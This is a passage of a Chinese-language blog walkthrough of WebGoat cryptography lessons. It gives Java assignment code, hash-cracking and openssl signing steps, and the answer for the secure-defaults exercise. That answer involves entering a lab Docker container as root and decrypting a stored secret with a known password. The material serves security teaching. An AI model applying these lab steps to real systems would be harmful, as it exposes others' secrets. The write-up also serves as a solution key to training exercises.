class="comment">//            获取一个byte数组</span></span><br><span class="line">            md5Hash = DatatypeConverter</span><br><span class="line">                    .printHexBinary(digest).toUpperCase();</span><br><span class="line"><span class="comment">//          通过java工具类将字节数组转换成 str 接着 转换成大写</span></span><br><span class="line">            request.getSession().setAttribute(<span class="string">&quot;md5Hash&quot;</span>,md5Hash);</span><br><span class="line"><span class="comment">//            密文和明文都放入session</span></span><br><span class="line">            request.getSession().setAttribute(<span class="string">&quot;md5Secret&quot;</span>,secret);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> md5Hash;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping(path = &quot;/crypto/hashing/sha256&quot;,produces = MediaType.TEXT_HTML_VALUE)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSha256</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> NoSuchAlgorithmException&#123;</span><br><span class="line"><span class="comment">//        同样先判断session中有无</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">sha256</span> <span class="operator">=</span> (String) request.getSession().getAttribute(<span class="string">&quot;sha256&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sha256 == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">secret</span> <span class="operator">=</span> SECRETS[<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(SECRETS.length)];</span><br><span class="line"><span class="comment">//            获取明文</span></span><br><span class="line">            sha256 = getHash(secret,<span class="string">&quot;SHA-256&quot;</span>);</span><br><span class="line"><span class="comment">//            通过 下面的getHash 获取 密文</span></span><br><span class="line">            request.getSession().setAttribute(<span class="string">&quot;sha256Hash&quot;</span>,sha256);</span><br><span class="line">            request.getSession().setAttribute(<span class="string">&quot;sha256Secret&quot;</span>,secret);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sha256;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/crypto/hashing&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(HttpServletRequest request,</span></span><br><span class="line"><span class="params">                                  <span class="meta">@RequestParam</span> String answer_pwd1,</span></span><br><span class="line"><span class="params">                                  <span class="meta">@RequestParam</span> String answer_pwd2)</span>&#123;</span><br><span class="line">        <span class="type">String</span>  <span class="variable">md5Secret</span> <span class="operator">=</span> (String) request.getSession().getAttribute(<span class="string">&quot;md5Secret&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">sha256Secret</span> <span class="operator">=</span> (String) request.getSession().getAttribute(<span class="string">&quot;sha256Secret&quot;</span>);</span><br><span class="line"><span class="comment">//      简单判断</span></span><br><span class="line">        <span class="keyword">if</span> (answer_pwd1 != <span class="literal">null</span> &amp;&amp; answer_pwd2 != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (answer_pwd1.equals(md5Secret)</span><br><span class="line">                &amp;&amp; answer_pwd2.equals(sha256Secret))&#123;</span><br><span class="line">                <span class="keyword">return</span> success(<span class="built_in">this</span>)</span><br><span class="line">                        .feedback(<span class="string">&quot;crypto-hashing.success&quot;</span>)</span><br><span class="line">                        .build();</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (answer_pwd1.equals(md5Secret) || answer_pwd2.equals(sha256Secret))&#123;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;crypto-hashing.oneok&quot;</span>).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;crypto-hashing.empty&quot;</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getHash</span><span class="params">(String  secret,String algorithm)</span> <span class="keyword">throws</span> NoSuchAlgorithmException&#123;</span><br><span class="line"><span class="comment">//        一个密文一个加密方法 剩下和上面一样</span></span><br><span class="line">        <span class="type">MessageDigest</span> <span class="variable">md</span> <span class="operator">=</span> MessageDigest.getInstance(algorithm);</span><br><span class="line">        md.update(secret.getBytes());</span><br><span class="line">        <span class="type">byte</span>[] digest = md.digest();</span><br><span class="line">        <span class="keyword">return</span> DatatypeConverter</span><br><span class="line">                .printHexBinary(digest).toUpperCase();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220905220128712.png" alt="image-20220905220128712"></p>
<p>意思就是让我们解一下明文</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220905220150080.png" alt="image-20220905220150080"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220905220207067.png" alt="image-20220905220207067"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220905220541246.png" alt="image-20220905220541246"></p>
<h3 id="SigningAssignment"><a href="#SigningAssignment" class="headerlink" title="SigningAssignment"></a>SigningAssignment</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.cryptography;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.xml.bind.DatatypeConverter;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidAlgorithmParameterException;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.security.interfaces.RSAPublicKey;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;crypto-signing.hints.1&quot;,&quot;crypto-signing.hints.2&quot;, &quot;crypto-signing.hints.3&quot;, &quot;crypto-signing.hints.4&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SigningAssignment</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(path = &quot;/crypto/signing/getprivate&quot;,produces = MediaType.TEXT_HTML_VALUE)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPrivateKey</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> NoSuchAlgorithmException, InvalidAlgorithmParameterException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">privateKey</span> <span class="operator">=</span> (String) request.getSession().getAttribute(<span class="string">&quot;privateKeyString&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (privateKey == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> CryptoUtil.generateKeyPair();</span><br><span class="line"><span class="comment">//            首先生成密钥对</span></span><br><span class="line">            privateKey = CryptoUtil.getPrivateKeyInPEM(keyPair);</span><br><span class="line"><span class="comment">//            生成可以发送的密钥 也就是前后添加规范字符</span></span><br><span class="line">            request.getSession().setAttribute(<span class="string">&quot;privateKeyString&quot;</span>,privateKey);</span><br><span class="line">            request.getSession().setAttribute(<span class="string">&quot;keyPair&quot;</span>,keyPair);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> privateKey;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/crypto/signing/verify&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(HttpServletRequest request,</span></span><br><span class="line"><span class="params">                                  <span class="meta">@RequestParam</span> String modulus,</span></span><br><span class="line"><span class="params">                                  <span class="meta">@RequestParam</span> String signature)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">tempModulus</span> <span class="operator">=</span> modulus;</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> (KeyPair) request.getSession().getAttribute(<span class="string">&quot;keyPair&quot;</span>);</span><br><span class="line">        <span class="type">RSAPublicKey</span> <span class="variable">rsaPublicKey</span> <span class="operator">=</span> (RSAPublicKey) keyPair.getPublic();</span><br><span class="line"><span class="comment">//        获取公钥</span></span><br><span class="line">        <span class="keyword">if</span> (tempModulus.length() == <span class="number">512</span>)&#123;</span><br><span class="line">            tempModulus = <span class="string">&quot;00&quot;</span>.concat(tempModulus);</span><br><span class="line"><span class="comment">//            如果长度是512 就用00去拼接</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!DatatypeConverter.printHexBinary(rsaPublicKey.getModulus().toByteArray()).equals(tempModulus.toUpperCase()))&#123;</span><br><span class="line"><span class="comment">//            如果获取公钥的16进制 等于tempModulus</span></span><br><span class="line">            log.warn(<span class="string">&quot;modulus &#123;&#125; incorrect&quot;</span>,modulus);</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;crypto-signing.modulusnotok&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (CryptoUtil.verifyAssignment(modulus,signature,keyPair.getPublic()))&#123;</span><br><span class="line"><span class="comment">//            如果起签名验证正确</span></span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;crypto-signing.success&quot;</span>).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;signature incorrect&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;crypto-signing.notok&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CryptoUtil"><a href="#CryptoUtil" class="headerlink" title="CryptoUtil"></a>CryptoUtil</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.cryptography;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.bind.DatatypeConverter;</span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.Charset;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.security.interfaces.RSAPublicKey;</span><br><span class="line"><span class="keyword">import</span> java.security.spec.InvalidKeySpecException;</span><br><span class="line"><span class="keyword">import</span> java.security.spec.PKCS8EncodedKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.security.spec.RSAKeyGenParameterSpec;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CryptoUtil</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> BigInteger[] FERMAT_PRIMS = &#123;</span><br><span class="line">            BigInteger.valueOf(<span class="number">3</span>),</span><br><span class="line">            BigInteger.valueOf(<span class="number">5</span>),</span><br><span class="line">            BigInteger.valueOf(<span class="number">17</span>),</span><br><span class="line">            BigInteger.valueOf(<span class="number">257</span>),</span><br><span class="line">            BigInteger.valueOf(<span class="number">65537</span>)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> KeyPair <span class="title function_">generateKeyPair</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchAlgorithmException, InvalidAlgorithmParameterException &#123;</span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">keyPairGenerator</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;RSA&quot;</span>);</span><br><span class="line"><span class="comment">//      KeyPairGenerator 用于生成一个RSA 密钥对</span></span><br><span class="line">        <span class="type">RSAKeyGenParameterSpec</span> <span class="variable">kpgSpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RSAKeyGenParameterSpec</span>(<span class="number">2048</span>, FERMAT_PRIMS[<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(FERMAT_PRIMS.length)]);</span><br><span class="line"><span class="comment">//      这里是通过 RSAKeyGenParameterSpec 指定用于生成密钥的参数集</span></span><br><span class="line">        keyPairGenerator.initialize(kpgSpec);</span><br><span class="line"><span class="comment">//        将参数集传入进去</span></span><br><span class="line">        <span class="keyword">return</span> keyPairGenerator.generateKeyPair();</span><br><span class="line"><span class="comment">//        生成密钥对的简单持有者 目的是用于暂存 密钥对?</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getPrivateKeyInPEM</span><span class="params">(KeyPair keyPair)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">encodedString</span> <span class="operator">=</span> <span class="string">&quot;-----BEGIN PRIVATE KEY-----\n&quot;</span>;</span><br><span class="line">        encodedString = encodedString + <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(keyPair.getPrivate().getEncoded()), Charset.forName(<span class="string">&quot;UTF-8&quot;</span>)) + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">//        这里是对密钥进行拼接 生成私钥 上面的方法生成的 KeyPair 在这里 取到了里面的私钥</span></span><br><span class="line">        encodedString = encodedString + <span class="string">&quot;-----END PRIVATE KEY-----\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> encodedString;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">signMessage</span><span class="params">(String message, PrivateKey privateKey)</span> &#123;</span><br><span class="line">        log.debug(<span class="string">&quot;start signMessage&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">signature</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Signature</span> <span class="variable">instance</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;SHA256withRSA&quot;</span>);</span><br><span class="line"><span class="comment">//            获取签名方法</span></span><br><span class="line">            instance.initSign(privateKey);</span><br><span class="line"><span class="comment">//            对签名初始化</span></span><br><span class="line">            instance.update(message.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"><span class="comment">//            将信息进行加密</span></span><br><span class="line">            signature = <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(instance.sign()), Charset.forName(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"><span class="comment">//            对信息进行签名</span></span><br><span class="line">            log.info(<span class="string">&quot;signe the signature with result:&#123;&#125;&quot;</span>, signature);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">            log.info(<span class="string">&quot;signe the signature with result: &#123;&#125;&quot;</span>, signature);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;Signature signing failed&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        log.debug(<span class="string">&quot;end signMessage&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> signature;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">verifyMessage</span><span class="params">(String message, String base64EncSignature, PublicKey publicKey)</span> &#123;</span><br><span class="line">        log.debug(<span class="string">&quot;start verifyMessage&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        base64EncSignature = base64EncSignature.replace(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">                .replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">                .replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="comment">//        验证信息</span></span><br><span class="line">        <span class="type">byte</span>[] decodedSignature = Base64.getDecoder().decode(base64EncSignature);</span><br><span class="line"><span class="comment">//        先进行base64解码</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Signature</span> <span class="variable">instance</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;SHA256withRSA&quot;</span>);</span><br><span class="line">            instance.initVerify(publicKey);</span><br><span class="line"><span class="comment">//          通过获取的公钥进行签名</span></span><br><span class="line">            instance.update(message.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"><span class="comment">//            对明文进行处理</span></span><br><span class="line">            result = instance.verify(decodedSignature);</span><br><span class="line"><span class="comment">//            进行签名</span></span><br><span class="line">            log.info(<span class="string">&quot;Signature verification failed&quot;</span>, result);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;Signature verification failed&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        log.debug(<span class="string">&quot;end verifyMessage&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">verifyAssignment</span><span class="params">(String modulus, String signature, PublicKey publicKey)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (modulus != <span class="literal">null</span> &amp;&amp; signature != <span class="literal">null</span>) &#123;</span><br><span class="line">            result = verifyMessage(modulus, signature, publicKey);</span><br><span class="line">            </span><br><span class="line">            <span class="type">RSAPublicKey</span> <span class="variable">rsaPublicKey</span> <span class="operator">=</span> (RSAPublicKey) publicKey;</span><br><span class="line">            <span class="keyword">if</span> (modulus.length() == <span class="number">512</span>) &#123;</span><br><span class="line">                modulus = <span class="string">&quot;00&quot;</span>.concat(modulus);</span><br><span class="line">            &#125;</span><br><span class="line">            result = result &amp;&amp; (DatatypeConverter.printHexBinary(rsaPublicKey.getModulus().toByteArray()).equals(modulus.toUpperCase()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> PrivateKey <span class="title function_">getPrivateKeyFromPEM</span><span class="params">(String privateKeyPem)</span> <span class="keyword">throws</span> NoSuchAlgorithmException, InvalidKeySpecException &#123;</span><br><span class="line">        privateKeyPem = privateKeyPem.replace(<span class="string">&quot;-----BEGIN PRIVATE KEY-----&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        privateKeyPem = privateKeyPem.replace(<span class="string">&quot;-----END PRIVATE KEY-----&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        privateKeyPem = privateKeyPem.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] decoded = Base64.getDecoder().decode(privateKeyPem);</span><br><span class="line">        <span class="type">PKCS8EncodedKeySpec</span> <span class="variable">spec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PKCS8EncodedKeySpec</span>(decoded);</span><br><span class="line"><span class="comment">//        获取一个 pkcs8加密</span></span><br><span class="line">        <span class="type">KeyFactory</span> <span class="variable">kf</span> <span class="operator">=</span> KeyFactory.getInstance(<span class="string">&quot;RSA&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> kf.generatePrivate(spec);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907110138212.png" alt="image-20220907110138212"></p>
<p>打开了题目是给了我们私钥 让我们去提取公钥的模数与签名</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907120305221.png" alt="image-20220907120305221"></p>
<p>将私钥存入文件pri.key </p>
<p>获取对应公钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl rsa -in pri.key -pubout &gt; pub.key</span><br><span class="line">rsa 表示采用rsa加密方式</span><br><span class="line">-in 表示添加要加密的文件</span><br><span class="line">-pubout 表示根据提供的私钥,从中提取出公钥</span><br><span class="line">&gt; pub.key 表示提取出来的公钥存入文件pub.key</span><br></pre></td></tr></table></figure>

<p><img src="C:/Users/14980/AppData/Roaming/Typora/typora-user-images/image-20220907120212258.png" alt="image-20220907120212258"></p>
<p>获取对应的modulus</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl rsa -in pub.key -pubin -modulus -noout</span><br><span class="line">-pubin 表示读取的文件必须是公钥文件 </span><br><span class="line">-modulus 表示提取模数 </span><br><span class="line">-noout  表示不输出加密的证书内容</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907120426316.png" alt="image-20220907120426316"></p>
<p>获取私钥的签名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo -n &quot;98039F5125887DFB3C2C1B339AC37ADF21A3B0A57B6103905C2F318191864EFF386EE103625A928CEFECF052BDC887D65EB3505AF55E3E2B13341DD99E29AEF2D27F471B58CA619C5DFDEB57BA9F1A312CDBFEC7E2C5EDE17D8033B2F177B87B3668188B9A57AFFC12BEE4985EC281D51658DAFC097F76762AAEB953232255CAFD0317675F7345364328849C5616FD147E7557BBF4855F11CE634B7A5EE9C5CF0B0FCDC4FB2329C77885A60DE89131EC749BC7423A05BA91114C9D3C730E0B462879F8D783AE068F73CF1EDD0AECFD6B4A15BB1259F23348B36C0A9BCD2FBA1A824CAFDFDC4796E5C1E113B91B0721624AEFC5843D5B836B4797F38FE183040D&quot; | openssl dgst -sign pri.key -sha256 -out sign.sha256</span><br><span class="line">dgst 代表单向加密</span><br><span class="line">-sign 代表使用私钥加密</span><br><span class="line">-sha256 代表加密算法是sha256</span><br><span class="line">-out sign.sha256 代表输出内容到文件</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907122543161.png" alt="image-20220907122543161"></p>
<p>由于是不可见字符 因此我们先进行base64加密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat sign.sha256 | base64</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907123317981.png" alt="image-20220907123317981"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907123537021.png" alt="image-20220907123537021"></p>
<h3 id="SecureDefaultsAssignment"><a href="#SecureDefaultsAssignment" class="headerlink" title="SecureDefaultsAssignment"></a>SecureDefaultsAssignment</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.cryptography;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;crypto-secure-defaults.hints.1&quot;, &quot;crypto-secure-defaults.hints.2&quot;, &quot;crypto-secure-defaults.hints.3&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecureDefaultsAssignment</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/crypto/secure/defaults&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String secretFileName,</span></span><br><span class="line"><span class="params">                                  <span class="meta">@RequestParam</span> String secretText)</span><span class="keyword">throws</span> NoSuchAlgorithmException&#123;</span><br><span class="line">        <span class="keyword">if</span> (secretFileName != <span class="literal">null</span> &amp;&amp; secretFileName.equals(<span class="string">&quot;default_secret&quot;</span>))&#123;</span><br><span class="line"><span class="comment">//            如果密文文件名不为空 并且 密文文件名为 default_secret</span></span><br><span class="line">            <span class="keyword">if</span> (secretText!= <span class="literal">null</span> &amp;&amp; HashingAssignment.getHash(secretText,<span class="string">&quot;SHA-256&quot;</span>).equalsIgnoreCase(<span class="string">&quot;34de66e5caf2cb69ff2bebdc1f3091ecf6296852446c718e38ebfa60e4aa75d2&quot;</span>))&#123;</span><br><span class="line"><span class="comment">//                如果密文不为空 并且经过SHA-256 加密后与字符串相同</span></span><br><span class="line">                <span class="keyword">return</span> success(<span class="built_in">this</span>)</span><br><span class="line">                        .feedback(<span class="string">&quot;crypto-secure-defaults.success&quot;</span>)</span><br><span class="line">                        .build();</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;crypto-secure-defaults.messagenotok&quot;</span>).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;crypto-secure-defaults.notok&quot;</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907124752947.png" alt="image-20220907124752947"></p>
<p>这里说的挺清楚了 拉下docker 启动下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d webgoat/assignments:findthesecret</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907125159088.png" alt="image-20220907125159088"></p>
<p>看下容器id 并以root用户进入容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it --user root  8e7bc8220b03 /bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907125554049.png" alt="image-20220907125554049"></p>
<p>先到root目录下 接着查看文件名接着解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;U2FsdGVkX199jgh5oANElFdtCxIEvdEvciLi+v+5loE+VCuy6Ii0b+5byb5DXp32RPmT02Ek1pf55ctQN+DHbwCPiVRfFQamDmbHBUpD7as=&quot; | openssl enc -aes-256-cbc -d -a -k ThisIsMySecretPassw0rdF0rY0u</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907125934324.png" alt="image-20220907125934324"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907131143402.png" alt="image-20220907131143402"></p>
